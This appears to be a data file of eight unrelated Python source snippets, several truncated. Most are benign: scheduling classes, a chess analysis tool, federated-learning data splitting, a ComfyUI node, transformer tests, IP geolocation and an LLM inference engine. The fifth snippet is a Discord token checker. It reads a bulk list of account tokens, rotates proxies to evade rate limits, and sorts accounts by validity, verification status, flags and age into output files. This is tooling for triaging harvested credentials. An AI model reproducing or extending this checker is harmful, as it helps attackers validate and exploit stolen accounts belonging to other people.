    "from datetime import datetime, timedelta\nclass InterviewTime:\n    '''\n    \u9762\u8bd5\u65f6\u95f4\u7c7b\n    \u5b58\u50a8\u4e00\u4e2a\u9762\u8bd5\u65f6\u95f4\u6bb5\u7684\u65e5\u671f\u3001\u65f6\u95f4\u3001\u5730\u70b9\u3001\u9762\u8bd5\u8005\u4fe1\u606f\u3001\u9762\u8bd5\u5b98\u4fe1\u606f\n    '''\n    datetime = [] #\u5f00\u59cb\u65f6\u95f4\u548c\u7ed3\u675f\u65f6\u95f4,datetime\u683c\u5f0f\n    datetime_str = \"\" #\u5f00\u59cb\u65f6\u95f4\u548c\u7ed3\u675f\u65f6\u95f4,\u5b57\u7b26\u4e32\u683c\u5f0f\n    positions = []\n    staff_position = ''\n    interviewers = []\n    interviewees = []\n    def __init__(self, now, end, positions, staff_position):\n        self.datetime = [now, end]\n        self.positions = positions\n        self.datetime_str = now.strftime(\"%Y.%m.%d %H:%M:%S\") + \"-\" + end.strftime(\"%Y.%m.%d %H:%M:%S\")\n        self.interviewers = []\n        self.interviewees = []\n        self.staff_position = staff_position\n\nclass Interviewee:\n    '''\n    \u9762\u8bd5\u8005\u7c7b\n    \u5b58\u50a8\u4e00\u4e2a\u9762\u8bd5\u8005\u7684\u59d3\u540d\u3001\u5b66\u53f7\u3001\u9762\u8bd5\u65f6\u95f4\n    '''\n    name = ''\n    id = ''\n    email = ''\n    tel = ''\n    jaccount = ''\n    interview_time = ''\n    def __init__(self, name, id, tel, email):\n        self.name = name\n        self.id = id\n        self.tel = tel\n        self.email = email\n        self.jaccount = email.split('@')[0]\n        self.interview_time = ''\n   \n        \nclass Interviewer_interviewtime:\n    '''\n    \u9762\u8bd5\u5b98\u548c\u9762\u8bd5\u65f6\u95f4\u6bb5\u7684\u5bf9\u5e94\u7c7b\n    \u5b58\u50a8\u4e00\u4e2a\u9762\u8bd5\u65f6\u95f4\u6bb5\u548c\u4e00\u4e2a\u9762\u8bd5\u5730\u70b9\u7684\u5bf9\u5e94\u5173\u7cfb\n    '''\n    interviewTime = ''\n    position = ''\n    def __init__(self, interviewTime, position):\n        self.interviewTime = interviewTime\n        self.position = position\n\nclass Interviewer:\n    '''\n    \u9762\u8bd5\u5b98\u7c7b\n    \u5b58\u50a8\u4e00\u4e2a\u9762\u8bd5\u5b98\u7684\u59d3\u540d\u3001\u6709\u7a7a\u65f6\u95f4\u3001\u9762\u8bd5\u65f6\u95f4\n    '''\n    name = ''\n    available_time = [] #\u9762\u8bd5\u5b98\u6709\u7a7a\u7684\u65f6\u95f4\u6bb5\n    interview_time = []\n    staff_available_time = [] #\u573a\u52a1\u6709\u7a7a\u7684\u65f6\u95f4\u6bb5\n    staff_time = [] #\u573a\u52a1\u7684\u65f6\u95f4\u6bb5\n    def __init__(self, name):\n        self.name = name\n        self.available_time = []\n        self.interview_time = []\n        self.staff_available_time = []\n        self.staff_time = []",
    "#!/usr/bin/python3\n#\n# Copyright 2024 Sami Kiminki\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\nfrom optparse import OptionParser\nfrom pathlib import Path\nimport berserk\nimport chess\nimport chess.engine\nimport chess.pgn\nimport datetime\nimport json\nimport logging\nimport sys\nimport traceback\n\nVERSION=\"0.1-dev\"\n\n\ndef enable_debug_logging(option, opt, value, parser):\n    logging.basicConfig(level=logging.DEBUG)\n\ndef processarguments():\n    parser = OptionParser(\n        version=\"novelty-grinder \" + VERSION,\n        usage = 'usage: novelty-grinder [options] FILE.pgn',\n        description = '''The Grand Novelty Grinder\nsearches for suprise moves and novelties with Lc0 and Lichess.''',\n        epilog='''Quick instructions:\n(1) Configure Lc0 for Nibbler. When using contempt, configure both colors\nseparately.\n(2) Prepare lines or games to analyze in FILE.pgn.\n(3) Run the novelty grinder to find interesting novelties and rarities.\nAnnotated PGN is written in stdout.''')\n\n    parser.add_option(\n        \"-E\", \"--engines-json\", dest=\"enginesJsonPath\",\n        help=\"Nibbler engines.json file [default: %default]\",\n        metavar=\"FILE\",\n        type=\"string\",\n        default=str(Path.home() / \".config\" / \"Nibbler\" / \"engines.json\"))\n\n    parser.add_option(\n        \"-T\", \"--lichess-token-file\", dest=\"lichessTokenFile\",\n        help=\"Lichess API token file. Optional, may help in case of getting \" +\n        \"API rate-limited. [default: %default]\",\n        metavar=\"FILE\",\n        type=\"string\")\n\n    parser.add_option(\n        \"-w\", \"--white-engine\", dest=\"whiteEngine\",\n        help=\"Engine for white side analysis. Full path can be omitted as long as \" +\n        \"the engine is unambiguous.\",\n        type=\"string\",\n        metavar=\"STR\")\n\n    parser.add_option(\n        \"-b\", \"--black-engine\", dest=\"blackEngine\",\n        help=\"Engine for black side analysis. Full path can be omitted as long as \" +\n        \"the engine is unambiguous.\",\n        metavar=\"STR\")\n\n    parser.add_option(\n        \"-e\", \"--engine\", dest=\"engine\",\n        help=\"Analysis engine for both sides. Full path can be omitted as long as \" +\n        \"the engine is unambiguous.\",\n        type=\"string\",\n        metavar=\"STR\")\n\n    parser.add_option(\n        \"-n\", \"--nodes\", dest=\"analysisNodes\",\n        help=\"Nodes per move to analyze. [default: %default]\",\n        type=\"int\",\n        metavar=\"NODES\",\n        default=100000)\n\n    parser.add_option(\n        \"\",  \"--eval-threshold\", dest=\"evalThresholdCp\",\n        help=\"Engine evaluation score threshold for considering novelties. Moves with at least \" +\n        \"(FIRST_PV_SCORE - EVAL_DIFF) evaluation score are considered for novelties. In centipawns. \" +\n        \"Note: Comparison is against the first PV move, not the highest PV evaluation. \"\n        \"[default: %default]\",\n        type=\"int\",\n        metavar=\"EVAL_DIFF\",\n        default=200)\n\n    parser.add_option(\n        \"\",  \"--rarity-threshold-freq\", dest=\"rarityThresholdFreq\",\n        help=\"Book moves that are played at most FREQ frequency are considered 'rare' moves. \" +\n        \"[default: %default]\",\n        type=\"float\",\n        metavar=\"FREQ\",\n        default=0.05)\n\n    parser.add_option(\n        \"\",  \"--rarity-threshold-count\", dest=\"rarityThresholdCount\",\n        help=\"Book move that is played at most NUM times total are considered 'rare' moves \" +\n        \"regardless of the frequency. [default: %default]\",\n        type=\"int\",\n        metavar=\"NUM\",\n        default=0)\n\n    parser.add_option(\n        \"\",  \"--first-move\", dest=\"firstMove\",\n        help=\"First move to analyze (skip previous). [default: %default]\",\n        type=\"int\",\n        metavar=\"MOVE_NUM\",\n        default=1)\n\n    parser.add_option(\n        \"\",  \"--book-cutoff\", dest=\"bookCutoff\",\n        help=\"Stop analysis when the book has fewer than at most NUM games. \" +\n        \"[default: %default]\",\n        type=\"int\",\n        metavar=\"NUM\",\n        default=2)\n\n    parser.add_option(\n        \"\",  \"--arrows\", dest=\"arrows\", default=False,\n        help=\"Add arrows in the annotated PGN: red = novelty; green = unpopular move.\",\n        action=\"store_true\")\n\n    parser.add_option(\n        \"\",  \"--debug\",\n        help=\"Enable debug mode\",\n        action=\"callback\",\n        callback=enable_debug_logging)\n\n    parser.add_option(\n        \"\", \"--double-check-nodes\", dest=\"doubleCheckNodes\",\n        help=\"After initial analysis, do focused analysis on candidate moves until they have at least NUM nodes. \" +\n        \"T",
    "import os\nimport logging\nimport numpy as np\nimport torch\nimport torch.nn as nn\nimport torchvision.transforms as transforms\nimport torch.nn.functional as F\nimport random\nfrom sklearn.metrics import confusion_matrix\nfrom torch.utils.data import DataLoader\n\nfrom models.model import *\nfrom other_utils.datasets import CIFAR10_truncated, FashionMNIST_truncated\n\n\nlogging.basicConfig()\nlogger = logging.getLogger()\nlogger.setLevel(logging.INFO)\n\ndef mkdirs(dirpath):\n    try:\n        os.makedirs(dirpath)\n    except Exception as _:\n        pass\n    \n\ndef load_fmnist_data(datadir):\n\n    transform = transforms.Compose([transforms.ToTensor()])\n\n    mnist_train_ds = FashionMNIST_truncated(datadir, train=True, download=True, transform=transform)\n    mnist_test_ds = FashionMNIST_truncated(datadir, train=False, download=True, transform=transform)\n\n    X_train, y_train = mnist_train_ds.data, mnist_train_ds.target\n    X_test, y_test = mnist_test_ds.data, mnist_test_ds.target\n\n    X_train = X_train.data.numpy()\n    y_train = y_train.data.numpy()\n    X_test = X_test.data.numpy()\n    y_test = y_test.data.numpy()\n\n    return (X_train, y_train, X_test, y_test)\n\n\ndef load_cifar10_data(datadir):\n\n    transform = transforms.Compose([transforms.ToTensor()])\n\n    cifar10_train_ds = CIFAR10_truncated(datadir, train=True, download=False, transform=transform)\n    cifar10_test_ds = CIFAR10_truncated(datadir, train=False, download=False, transform=transform)\n\n    X_train, y_train = cifar10_train_ds.data, cifar10_train_ds.target\n    X_test, y_test = cifar10_test_ds.data, cifar10_test_ds.target\n    \n    return (X_train, y_train, X_test, y_test)\n\ndef record_net_data_stats(y_train, net_dataidx_map, logdir):\n    net_cls_counts = {}\n    for net_i, dataidx in net_dataidx_map.items():\n        unq, unq_cnt = np.unique(y_train[dataidx], return_counts=True)\n        tmp = {unq[i]: unq_cnt[i] for i in range(len(unq))}\n        net_cls_counts[net_i] = tmp\n\n    logger.info('Data statistics: %s' % str(net_cls_counts))\n    return net_cls_counts\n\ndef partition_data(dataset, datadir, logdir, partition, n_clients, n_sample, beta=0.4):\n\n    if dataset == 'fmnist':\n        X_train, y_train, X_test, y_test = load_fmnist_data(datadir)\n    elif dataset == 'cifar10':\n        X_train, y_train, X_test, y_test = load_cifar10_data(datadir)\n    else:\n        print(\"WARNING: No such dataset!\")\n        import os\n        os.exit(1)\n\n    n_train = y_train.shape[0]\n    \n    if partition == \"homo\":\n        idxs = np.random.permutation(n_train)\n        batch_idxs = np.array_split(idxs, n_clients)\n        net_dataidx_map = {i: batch_idxs[i] for i in range(n_clients)}\n        assert len(batch_idxs[0]) <= n_sample\n\n    elif partition == \"noniid-labeldir\":\n        min_size = 0\n        min_require_size = 10\n        K = 10  # classes\n        if dataset in ('celeba', 'covtype', 'a9a', 'rcv1', 'SUSY'):\n            K = 2\n\n        N = y_train.shape[0]\n        np.random.seed(2022)\n        net_dataidx_map = {}\n\n        while min_size < min_require_size:\n            idx_batch = [[] for _ in range(n_clients)]\n            for k in range(K):\n                idx_k = np.where(y_train == k)[0]\n                np.random.shuffle(idx_k)\n                proportions = np.random.dirichlet(np.repeat(beta, n_clients))\n                # logger.info(\"proportions1: \", proportions)\n                # logger.info(\"sum pro1:\", np.sum(proportions))\n                ## Balance\n                proportions = np.array([p * (len(idx_j) < N / n_clients) for p, idx_j in zip(proportions, idx_batch)])\n                # logger.info(\"proportions2: \", proportions)\n                proportions = proportions / proportions.sum()\n                # logger.info(\"proportions3: \", proportions)\n                proportions = (np.cumsum(proportions) * len(idx_k)).astype(int)[:-1]\n                # logger.info(\"proportions4: \", proportions)\n                idx_batch = [idx_j + idx.tolist() for idx_j, idx in zip(idx_batch, np.split(idx_k, proportions))]\n                min_size = min([len(idx_j) for idx_j in idx_batch])\n                # if K == 2 and n_clients <= 10:\n                #     if np.min(proportions) < 200:\n                #         min_size = 0\n                #         break\n\n        for j in range(n_clients):\n            np.random.shuffle(idx_batch[j])\n            net_dataidx_map[j] = idx_batch[j]\n            if n_sample > 0 and n_sample < len(net_dataidx_map[j]):\n                np.random.shuffle(net_dataidx_map[j])\n                net_dataidx_map[j] = net_dataidx_map[j][:n_sample]\n\n    elif partition > \"noniid-#label0\" and partition <= \"noniid-#label9\":\n        num = eval(partition[13:])\n        n_sample_c = int(n_sample/num)  # maximal numbers of samples per class\n        K = 10\n        if num == 10:\n            net_dataidx_map = {i:np.ndarray(0,dtype=np.int64) for i in range(n_clients)}\n            for i in range(10):\n                idx_k = np.where(y_train==i)[0]\n                np.random.shuffle(idx_k)\n                ",
    "import torch\nimport comfy.model_management\nimport comfy.samplers\n\nclass SchedulerMixer:\n    @classmethod\n    def INPUT_TYPES(s):\n        return {\n            \"required\": {\n                \"model\": (\"MODEL\",),\n                \"steps\": (\"INT\", {\"default\": 20, \"min\": 1, \"max\": 10000}),\n                \"denoise\": (\"FLOAT\", {\"default\": 1.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"normal\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"karras\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"exponential\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"sgm_uniform\": (\"FLOAT\", {\"default\": 0.5, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"simple\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n                \"ddim_uniform\": (\"FLOAT\", {\"default\": 0.5, \"min\": 0.0, \"max\": 1.0, \"step\": 0.01}),\n            }\n        }\n    \n    RETURN_TYPES = (\"SIGMAS\",)\n    CATEGORY = \"sampling/custom_sampling/schedulers\"\n    FUNCTION = \"get_sigmas\"\n\n    def get_sigmas(self, model, steps, denoise, normal, karras, exponential, sgm_uniform, simple, ddim_uniform):\n        total_steps = steps\n        if denoise < 1.0:\n            total_steps = int(steps / denoise)\n\n        comfy.model_management.load_models_gpu([model])\n\n        scheduler_weights = [normal, karras, exponential, sgm_uniform, simple, ddim_uniform]\n        scheduler_names = [\"normal\", \"karras\", \"exponential\", \"sgm_uniform\", \"simple\", \"ddim_uniform\"]\n\n        mixed_sigmas = torch.zeros((steps + 1,), device=\"cpu\", dtype=torch.float)\n        for weight, name in zip(scheduler_weights, scheduler_names):                        \n            if weight > 0.0:                \n                sigmas = comfy.samplers.calculate_sigmas_scheduler(model.model, name, total_steps).cpu()\n                sigmas = sigmas[-(steps + 1):]                \n                mixed_sigmas += sigmas * weight\n\n        return (mixed_sigmas,)\n    \n",
    "import utils.logger as logger\r\nimport concurrent.futures\r\nfrom colorama import *\r\nfrom pystyle import *\r\nimport tls_client\r\nimport threading\r\nimport colorama\r\nimport os, sys\r\nimport random\r\nimport ctypes\r\nimport msvcrt\r\nimport toml\r\nimport time\r\nimport json\r\n\r\n\r\n\r\ncolorama.init()\r\n\r\nconfig = toml.load(\"data/config.toml\")\r\nsettings = json.loads(open(\"data/settings.json\", \"r\").read())\r\n\r\nwith open(\"data/tokens.txt\", \"r\") as f:\r\n    tokens = f.readlines()\r\n\r\nwith open(\"data/proxies.txt\", \"r\") as f:\r\n    proxies = f.readlines()\r\n\r\ntokens = list(set(tokens))\r\n\r\nLOCK = threading.Lock()\r\nvalid = 0\r\ninvalid = 0\r\nlocked = 0\r\nnitro = 0\r\nflagged = 0\r\ntotal = len(tokens)\r\ncurrent = 0\r\ndone = False\r\n\r\n\r\n\r\n\r\nos.system('cls')\r\n\r\noutput_folder = f\"output/{time.strftime('%Y-%m-%d %H-%M-%S')}\"\r\nif not os.path.exists(output_folder):\r\n    os.makedirs(output_folder)\r\n\r\nstart = time.time()\r\n\r\nclass Checker:\r\n    def __init__(self) -> None: # Fuck this shit *_*\r\n        self.session = tls_client.Session(\r\n            client_identifier=\"chrome_104\"\r\n        )\r\n        self.session.headers = {\r\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\"\r\n        }\r\n        self.update_proxy() #buttsex\r\n    \r\n    def update_proxy(self):\r\n        if not config[\"main\"][\"proxyless\"]:\r\n            self.session.proxies = f\"http://{random.choice(proxies).strip()}\" #proxy handling!\r\n       \r\n    \r\n    def check(self) -> None:\r\n        global current, total, valid, locked, nitro, invalid, flagged\r\n\r\n        while True:\r\n            if len(tokens) == 0:\r\n                break\r\n            token = tokens.pop().strip() # .gg/pop\r\n            try:\r\n                token_only = token.split(\":\")[-1]\r\n                self.session.headers[\"Authorization\"] = token_only\r\n\r\n\r\n                r = self.session.get(f\"https://discord.com/api/v9/users/@me/guilds\")\r\n                if r.status_code == 429:\r\n                    logger.err(\"Rate limited\", token=token_only.split(\".\")[0])\r\n                    self.update_proxy()\r\n                    tokens.append(token)\r\n                    continue\r\n\r\n                current += 1\r\n\r\n                if r.status_code == 401:\r\n                    invalid += 1\r\n                    logger.err(\"Invalid\", token=token_only.split(\".\")[0])\r\n                    LOCK.acquire()\r\n                    with open(f\"{output_folder}/invalid.txt\", \"a\") as f:\r\n                        f.write(token + \"\\n\")\r\n                    LOCK.release()\r\n                    continue\r\n\r\n                if r.status_code == 403:\r\n                    locked += 1\r\n                    logger.err(\"Locked\", token=token_only.split(\".\")[0])\r\n                    LOCK.acquire()\r\n                    with open(f\"{output_folder}/locked.txt\", \"a\") as f:\r\n                        f.write(token + \"\\n\")\r\n                    LOCK.release()\r\n\r\n                if r.status_code == 200:\r\n\r\n\r\n                    # get discord account flags\r\n                    r = self.session.get(f\"https://discord.com/api/v9/users/@me\")\r\n                    args = {\r\n                        \"token\": token_only.split(\".\")[0],\r\n                    }\r\n\r\n                    if settings[\"flagged\"]:\r\n                        if r.json()[\"flags\"] & 1048576 == 1048576:\r\n                            flagged += 1\r\n                            logger.err(\"Flagged\", **args)\r\n                            LOCK.acquire()\r\n                            with open(f\"{output_folder}/flagged.txt\", \"a\") as f:\r\n                                f.write(token + \"\\n\")\r\n                            LOCK.release()\r\n                            continue\r\n\r\n                    if settings[\"type\"]:\r\n                        LOCK.acquire()\r\n                        type = \"unclaimed\"\r\n                        if r.json()[\"email\"] != None:\r\n                            type = \"email verified\"\r\n                        if r.json()[\"phone\"] != None:\r\n                            if type == \"email verified\":\r\n                                type = \"fully verified\"\r\n                            else:\r\n                                type = \"phone verified\"\r\n                    else:\r\n                        type = \"valid\"\r\n\r\n                    args[\"type\"] = type\r\n                    LOCK.release()\r\n\r\n\r\n                    if settings[\"age\"]:\r\n                        created_at = ((int(r.json()[\"id\"]) >> 22) + 1420070400000) / 1000\r\n                        age = (time.time() - created_at) / 86400 / 30\r\n                        if age > 12:\r\n                            args[\"age\"] = f\"{age/12:.0f} years\"\r\n                        else:\r\n                            args[\"age\"] = f\"{age:.0f} months\"\r\n\r\n                        if not os.path.exists(f\"{output_folder}/age/{args['age']}\"):\r\n                            os.makedirs(f\"{output_folder}/age/{args['age']}\")\r\n                        \r\n                        with open(f\"{output_folder}/age/{args['age']}/{ty",
    "#!/usr/bin/env python3\nimport numpy\nimport torch\nimport torch.nn.functional as F\n\nfrom .adapters import (\n    run_gelu,\n    run_multihead_self_attention,\n    run_positionwise_feedforward,\n    run_rmsnorm,\n    run_scaled_dot_product_attention,\n    run_transformer_block,\n    run_transformer_lm,\n)\nfrom .common import FIXTURES_PATH\n\n\ndef test_positionwise_feedforward():\n    reference_weights = torch.load(\n        FIXTURES_PATH / \"positionwise_feedforward_weights.pt\"\n    )\n    in_features = torch.load(FIXTURES_PATH / \"in_features.pt\")\n    expected_output = torch.load(\n        FIXTURES_PATH / \"positionwise_feedforward_expected_output.pt\"\n    )\n    d_model = 64\n    d_ff = 128\n\n    actual_output = run_positionwise_feedforward(\n        d_model=d_model, d_ff=d_ff, weights=reference_weights, in_features=in_features\n    )\n    numpy.testing.assert_allclose(\n        actual_output.detach().numpy(), expected_output.detach().numpy(), atol=1e-6\n    )\n\n\ndef test_scaled_dot_product_attention():\n    torch.manual_seed(42)\n    # Take the first batch item, so we test the 3D case\n    # (input shape (batch_size, seq_len, d_k)) for scaled dot-product attention.\n    K = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_K.pt\")[0]\n    Q = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_Q.pt\")[0]\n    V = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_V.pt\")[0]\n    mask = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_mask.pt\")\n    pdrop = 0.0\n    expected_output = torch.load(\n        FIXTURES_PATH / \"scaled_dot_product_attention_expected_output.pt\"\n    )[0]\n    actual_output = run_scaled_dot_product_attention(\n        K=K, Q=Q, V=V, mask=mask, pdrop=pdrop\n    )\n    numpy.testing.assert_allclose(\n        actual_output.detach().numpy(), expected_output.detach().numpy(), atol=1e-6\n    )\n\n\ndef test_4d_scaled_dot_product_attention():\n    torch.manual_seed(42)\n    # Shape: (batch_size, num_heads, seq_len, d_k)\n    K = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_K.pt\")\n    Q = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_Q.pt\")\n    V = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_V.pt\")\n    mask = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_mask.pt\")\n    pdrop = 0.0\n    expected_output = torch.load(\n        FIXTURES_PATH / \"scaled_dot_product_attention_expected_output.pt\"\n    )\n    actual_output = run_scaled_dot_product_attention(\n        K=K, Q=Q, V=V, mask=mask, pdrop=pdrop\n    )\n    numpy.testing.assert_allclose(\n        actual_output.detach().numpy(), expected_output.detach().numpy(), atol=1e-6\n    )\n\n\ndef test_multihead_self_attention():\n    reference_weights = torch.load(\n        FIXTURES_PATH / \"unbatched_multihead_self_attention_weights.pt\"\n    )\n    in_features = torch.load(FIXTURES_PATH / \"in_features.pt\")\n    expected_output = torch.load(\n        FIXTURES_PATH / \"unbatched_multihead_self_attention_expected_output.pt\"\n    )\n    d_model = 64\n    num_heads = 2\n    attn_pdrop = 0.0\n    actual_output = run_multihead_self_attention(\n        d_model=d_model,\n        num_heads=num_heads,\n        attn_pdrop=attn_pdrop,\n        weights=reference_weights,\n        in_features=in_features,\n    )\n    numpy.testing.assert_allclose(\n        actual_output.detach().numpy(), expected_output.detach().numpy(), atol=1e-6\n    )\n\n\ndef test_transformer_lm():\n    torch.manual_seed(42)\n    vocab_size = 100\n    context_length = 64\n    d_model = 128\n    num_layers = 2\n    num_heads = 2\n    d_ff = d_model * 4\n    attn_pdrop = 0.0\n    residual_pdrop = 0.0\n\n    reference_weights = torch.load(FIXTURES_PATH / \"transformer_lm_weights.pt\")\n    in_indices = torch.load(FIXTURES_PATH / \"in_indices.pt\")\n    expected_output = torch.load(FIXTURES_PATH / \"transformer_lm_expected_output.pt\")\n    actual_output = run_transformer_lm(\n        vocab_size=vocab_size,\n        context_length=context_length,\n        d_model=d_model,\n        num_layers=num_layers,\n        num_heads=num_heads,\n        d_ff=d_ff,\n        attn_pdrop=attn_pdrop,\n        residual_pdrop=residual_pdrop,\n        weights=reference_weights,\n        in_indices=in_indices,\n    )\n    numpy.testing.assert_allclose(\n        actual_output.detach().numpy(), expected_output.detach().numpy(), atol=1e-4\n    )\n\n\ndef test_transformer_lm_truncated_input():\n    torch.manual_seed(42)\n    vocab_size = 100\n    context_length = 64\n    d_model = 128\n    num_layers = 2\n    num_heads = 2\n    d_ff = d_model * 4\n    attn_pdrop = 0.0\n    residual_pdrop = 0.0\n\n    reference_weights = torch.load(FIXTURES_PATH / \"transformer_lm_weights.pt\")\n    in_indices_truncated = torch.load(FIXTURES_PATH / \"in_indices_truncated.pt\")\n    truncated_expected_output = torch.load(\n        FIXTURES_PATH / \"transformer_lm_truncated_expected_output.pt\"\n    )\n    truncated_actual_output = run_transformer_lm(\n        vocab_size=vocab_size,\n        context_length=context_length,\n        d_model=d_model,\n        num_layers=num_layers,\n        num_heads=num_heads,\n        d_ff=d_f",
    "import requests\n\ndef find_loc():\n    try:\n        # use the request module to get the public IP address of the machine using the ipify API\n        ipadd = requests.get(\"https://api.ipify.org\").text\n        # Construct the url for obtaining geographical information based on the IP address using the geojs.io API\n        url = \"https://get.geojs.io/v1/ip/geo/\" + ipadd + \".json\"\n\n        # use 'requests' to send a GET request to the geojs.io API and get the geographic information in JSON format\n        geo = requests.get(url)\n        geo.raise_for_status()  # Raise an exception for HTTP errors\n\n        geo_data = geo.json()\n\n        print(geo_data)  # print the obtained geographic in JSON format\n\n        # Extract relevant information from the JSON response\n        city = geo_data[\"city\"]\n        country = geo_data[\"country\"]\n        # state = geo_data[\"state\"]\n        latitude = geo_data[\"latitude\"]\n        longitude = geo_data[\"longitude\"]\n        timezone = geo_data[\"timezone\"]\n        internet = geo_data[\"organization\"]\n\n        # print the extracted information in a formatted manner\n        print(\n            f\"city = {city}\\ncountry = {country}\\n\\nlatitude = {latitude}\\nlongitude = {longitude}\\ntimezone = {timezone}\\ninternet = {internet}\"\n        )\n\n        return f\"city = {city}\\ncountry = {country}\\n\\nlatitude = {latitude}\\nlongitude = {longitude}\\ntimezone = {timezone}\\ninternet = {internet}\"\n\n    except requests.RequestException as e:\n        print(\"Error occurred during HTTP request:\", e)\n        return \"Error occurred during HTTP request. Please try again.\"\n    except KeyError as e:\n        print(\"KeyError occurred while parsing JSON response:\", e)\n        return \"Error occurred while parsing JSON response. Please try again.\"\n\nfind_loc()\n",
    "\"\"\"Implement Jet Engine API.\"\"\"\n\nimport copy\nfrom typing import Any, List, Optional, Tuple, Union\nimport threading\nimport functools\n\nfrom flax import struct\nfrom absl import logging\nimport jax\nfrom jax import numpy as jnp\nfrom jax.experimental import mesh_utils\nimport torch\nimport jax.sharding as jsharding\nimport numpy as np\n\nfrom jetstream.engine import engine_api, tokenizer_pb2, token_utils\nimport torch_xla2\nfrom jetstream_pt.third_party.llama2 import model_exportable, model_args\n\nfrom jetstream_pt import cache_manager\nfrom jetstream_pt import quantize\nfrom jetstream_pt.environment import JetEngineEnvironment, JetEngineEnvironmentData\n\nfrom torch.utils import _pytree as pytree\nimport torch\n\n\n\nMesh = jax.sharding.Mesh\nP = jax.sharding.PartitionSpec\n\nParams = jax.Array\nPrefillInputs = jax.Array\n\n@struct.dataclass\nclass Prefix:\n  token: jax.Array  # [1, seqlen]\n  caches: List[Tuple[jax.Array, jax.Array]]\n  seq_len: int  # true seqlen front pad\n\n@struct.dataclass\nclass DecodeState:\n  tokens: jax.Array   # [batch_size, seqlen]\n  caches: List[Tuple[jax.Array, jax.Array]]\n  cache_scales: List[Tuple[jax.Array, jax.Array]]  # only present in quantized kv\n  current_position: int\n  lens: jax.Array # [batch_size, 1]\n  input_pos: jax.Array # [batch_size, 1] input pos for each slot\n  mask: jax.Array # [batch_size, seqlen] -inf for invalid; 0 for valid\n\n\n# NOTE model specific\n\n\nclass PyTorchEngine(engine_api.Engine):\n  \"\"\"Wraps functions to the Jet Engine API format.\"\"\"\n\n  def __init__(\n      self,\n      pt_model: torch.nn.Module,\n      env: JetEngineEnvironment,\n  ):\n    self.pt_model = pt_model\n    self.env = env\n\n    # NOTE: this is llama2 specific now.\n    self.param = pt_model.params\n\n    self.y_sharding = env.sharding_by_axis(1)\n    self.x_sharding = env.sharding_by_axis(0)\n    self.replicated = env.sharding_by_axis(-1) # replicated\n    self.cache_sharding = self.y_sharding\n\n    self.prefill = jax.jit(self.prefill, out_shardings=self.get_prefix_destination_sharding())\n    self.insert = jax.jit(self.insert, donate_argnums=(0, 1), out_shardings=self.get_decode_state_sharding())\n    self.generate = jax.jit(self.generate, donate_argnums=(1, ), out_shardings=(self.get_decode_state_sharding(), None))\n    # self._insert_wrap = jax.jit(self._insert_wrap, donate_argnums=(0, 1),\n    #                              out_shardings=self.get_decode_state_sharding())\n\n    # self._insert_no_wrap = jax.jit(\n    #      self._insert_no_wrap, \n    #      donate_argnums=(0, 1), \n    #      out_shardings=self.get_decode_state_sharding())\n    self._lock = threading.RLock()\n\n  def sharding_by_name(self, name):\n\n    # This allows easier way to edit shardings\n    \"\"\"\n    for key, val in self.env._data.experimental_sharding_axis_override.items():\n      if name.endswith(key): \n        return self.env.sharding_by_axis(val)\n    \"\"\"\n\n    if 'weight_scaler' in name:\n      return self.x_sharding\n    if \"tok_embeddings.\" in name:\n        return self.y_sharding\n    if \"attention.\" in name:\n        if \"wo\" in name:\n            return self.y_sharding\n        else:\n            return self.x_sharding\n    if \"feed_forward.\" in name:\n        if \"w2\" in name:\n            return self.y_sharding\n        else:\n            return self.x_sharding\n    if \"output\" in name:\n        return self.x_sharding \n    return self.replicated \n\n  def init_decode_state(\n      self,\n  ) -> DecodeState:\n    caches_obj = self.env.make_caches_generate()\n    caches = [c.state() for c in caches_obj]\n    scalers = []\n    if self.env.enable_kv_quantization:\n      scalers = [c.scalers() for c in caches_obj]\n    return DecodeState(\n        jnp.zeros((self.env.batch_size, 1), dtype=jnp.int32),\n        caches,\n        scalers,\n        self.env.max_input_sequence_length,\n        jnp.zeros((self.env.batch_size, 1), dtype=jnp.int32),\n        jnp.zeros((self.env.batch_size, ), dtype=jnp.int32),  # input pos \n        jnp.full((self.env.batch_size, self.env.cache_sequence_length), float('-inf'), \n                  dtype=jnp.bfloat16),\n    )\n\n  def _call_model_generate(\n    self, \n    weights, \n    tokens, \n    input_indexes, \n    caches, \n    cache_scales,\n    mask,\n    input_pos,\n  ):\n    if self.env.enable_kv_quantization:\n      caches_obj = [\n        cache_manager.Int8KVCacheGenerate(\n          k, v, ks, vs, input_indexes) for (k, v), (ks, vs) \n          in torch_xla2.tensor.wrap(list(zip(caches, cache_scales)))\n      ]\n    else:\n      caches_obj = [\n        cache_manager.KVCacheGenerate(\n          k, v, input_indexes, self.cache_sharding) for k, v in torch_xla2.tensor.wrap(caches)\n      ]\n    mask = jnp.expand_dims(mask, (1, 2))\n    \n    args = (\n      tokens, input_pos, caches_obj, mask \n    )\n    paramst, argst = torch_xla2.tensor.wrap((weights, args))\n    with self._lock:\n      with torch_xla2.tensor.XLADispatchMode():\n        res = torch.func.functional_call(self.pt_model, paramst, argst)\n    updated_caches = [c.state() for c in caches_obj]\n    